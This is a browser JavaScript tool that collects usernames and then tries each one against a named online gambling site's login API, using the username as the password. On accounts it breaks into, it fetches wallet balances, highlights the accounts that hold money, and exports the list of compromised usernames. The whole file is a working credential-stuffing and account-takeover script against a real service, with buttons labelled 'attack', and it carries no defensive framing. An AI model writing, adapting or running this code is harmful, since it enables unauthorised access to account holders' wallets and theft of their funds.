function generateWordList() {
    const text = document.getElementById('textInput').value;
    const fileInput = document.getElementById('fileInput');
    let words = text.split(/\s+/).filter(word => word);

    if (fileInput.files.length > 0) {
        const file = fileInput.files[0];
        const reader = new FileReader();
        reader.onload = function (e) {
            const fileText = e.target.result;
            words = words.concat(fileText.split(/\s+/).filter(word => word));
            processWords(words);
        };
        reader.readAsText(file);
    } else {
        processWords(words);
    }
}

function cleanWords(words) {
    const cleanedWords = [];
    words.forEach(word => {
        // Remove symbols and split into new words
        const splitWords = word.replace(/[^\w\s]/g, ' ').split(/\s+/).filter(w => w);
        cleanedWords.push(...splitWords);
    });
    return cleanedWords;
}

function processWords(words) {
    // Clean words first
    const cleanedWords = cleanWords(words);

    const uniqueWords = [...new Set(cleanedWords)];
    uniqueWords.sort();
    const wordListElement = document.getElementById('wordList');
    wordListElement.innerHTML = '';
    uniqueWords.forEach(word => {
        const li = document.createElement('li');
        li.textContent = word;
        wordListElement.appendChild(li);
    });
}

function removeDuplicates() {
    const wordListElement = document.getElementById('wordList');
    const uniqueWords = [...new Set(Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent))];
    wordListElement.innerHTML = '';
    uniqueWords.forEach(word => {
        const li = document.createElement('li');
        li.textContent = word;
        wordListElement.appendChild(li);
    });
}

function sortWordListAscending() {
    const wordListElement = document.getElementById('wordList');
    const words = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent);
    words.sort();
    wordListElement.innerHTML = '';
    words.forEach(word => {
        const li = document.createElement('li');
        li.textContent = word;
        wordListElement.appendChild(li);
    });
}

function downloadUsernames() {
    const wordListElement = document.getElementById('wordList');
    const usernames = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent).join('\n');
    const blob = new Blob([usernames], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'successID.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

document.getElementById('clearButton').addEventListener('click', function () {
    document.getElementById('wordList').innerHTML = '';
    document.getElementById('output').innerHTML = '';
    document.getElementById('textInput').value = '';
    document.getElementById('errorOutput').innerHTML = '';
});

let stopRequested = false;
let successfulLogins = [];

function fetchUsernamesFromProcessedList() {
    const wordListElement = document.getElementById('wordList');
    const usernames = [];
    wordListElement.querySelectorAll('li').forEach(li => {
        usernames.push(li.textContent);
    });
    return usernames;
}

async function tryLogin(username) {
    if (stopRequested) return null;

    const loginData = {
        domain: 'https://www.krikya11.com',
        membercode: username,
        password: username,
        platform: 'desktop',
        option: '2',
    };

    try {
        const loginResponse = await fetch('https://feapi.sharky777.xyz/api/token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(loginData),
        });

        const loginResult = await loginResponse.json();

        if (loginResponse.ok) {
            await fetchWalletDetails(loginResult.access_token, username);
        } else {
            displayErrorResponse(username, loginResult.error);
            console.log(`Login failed: ${username}`);
        }
    } catch (error) {
        console.error(`Error logging in ${username}:`, error);
        displayErrorResponse(username, error);
    }
}

async function fetchWalletDetails(token, username) {
    if (stopRequested) return;

    try {
        const response = await fetch('https://feapi.sharky777.xyz/api/member/wallets', {
            method: 'GET',
            headers: { Authorization: `Bearer ${token}` },
        });

        const result = await response.json();

        if (response.ok) {
            const wallets = result.data.wallets.map(wallet => ({
                code: wallet.wallet_code,
                balance: parseFloat(wallet.balance),
            }));
            displaySuccessResponse(username, wallets);
            successfulLogins.push({ username, wallets });
            document.getElementById('downloadBtn').disabled = false;
        } else {
            displayErrorResponse(username, result.error);
        }
    } catch (error) {
        console.error(`Error fetching wallet details for ${username}:`, error);
        displayErrorResponse(username, error);
    }
}

function displaySuccessResponse(username, wallets) {
    const successOutput = document.getElementById('successOutput');
    const responseDiv = document.createElement('div');
    responseDiv.innerHTML = `
        <h3>${username}</h3>
        <ul>
            ${wallets
                .map(
                    wallet => `
                    <li class="${wallet.balance >= 1 ? 'balance-blue' : 'hidden'}">
                        ${wallet.code}: ${wallet.balance >= 1 ? wallet.balance : parseInt(wallet.balance)}
                    </li>`
                )
                .join('')}
        </ul>
    `;
    successOutput.appendChild(responseDiv);
}

const attackButton = document.getElementById('attackButton');
const attackstopButton = document.getElementById('attackstopButton');

attackButton.addEventListener('click', () => {
    attackButton.style.display = 'none';
    attackstopButton.style.display = 'inline-block';
});

attackstopButton.addEventListener('click', () => {
    processLoginFile();
    attackButton.style.display = 'inline-block';
    attackstopButton.style.display = 'none';
    stopLoginAttempts();
});

async function processLoginFile() {
    stopRequested = false;
    successfulLogins = [];
    document.getElementById('successOutput').innerHTML = '<h3>USERNAME</h3>';
    document.getElementById('errorOutput').innerHTML = '<h3></h3>';
    document.getElementById('output').innerHTML = '';
    document.getElementById('downloadBtn').disabled = false;
    document.getElementById('loading').style.display = 'flex';

    const usernames = fetchUsernamesFromProcessedList();
    logMessage(`📂 TOTAL ${usernames.length} USERNAMES FOUND...`);

    for (const username of usernames) {
        if (stopRequested) {
            logMessage('STOPPED');
            document.getElementById('loading').style.display = 'none';
            attackButton.style.display = 'inline-block';
            attackstopButton.style.display = 'none';
            return;
        }
        try {
            await tryLogin(username);
        } catch (error) {
            displayErrorResponse(username, error);
        }
    }

    document.getElementById('loading').style.display = 'none';
    downloadResponses();
    alert('Login process finished!');
}

function displayErrorResponse(username, error) {
    const errorOutput = document.getElementById('errorOutput');
    const responseDiv = document.createElement('div');
    responseDiv.innerHTML = `
        <h3>${username}</h3>
        <p>Error: ${error.message}</p>
    `;
    errorOutput.appendChild(responseDiv);
    errorOutput.scrollTop = errorOutput.scrollHeight;
}

function stopLoginAttempts() {
    stopRequested = true;
    logMessage('⏹ Stopped');
    document.getElementById('loading').style.display = 'none';
}

function logMessage(message) {
    const output = document.getElementById('output');
    output.textContent += message + '\n';
}

function downloadResponses() {
    if (successfulLogins.length === 0) {
        alert('No usernames available for download.');
        return;
    }

    const usernamesContent = successfulLogins
        .map(login => login.username)
        .join('\n');

    const usernamesBlob = new Blob([usernamesContent], { type: 'text/plain' });
    const usernamesUrl = URL.createObjectURL(usernamesBlob);
    const usernamesA = document.createElement('a');
    usernamesA.href = usernamesUrl;
    usernamesA.download = 'usernames.txt';
    document.body.appendChild(usernamesA);
    usernamesA.click();
    document.body.removeChild(usernamesA);
    URL.revokeObjectURL(usernamesUrl);
}

// Add the new button for downloading the user list
document.addEventListener('DOMContentLoaded', (event) => {
    const downloadButton = document.createElement('button');
    downloadButton.textContent = 'Download User List';
    downloadButton.onclick = downloadUsernames;
    document.body.appendChild(downloadButton);
});
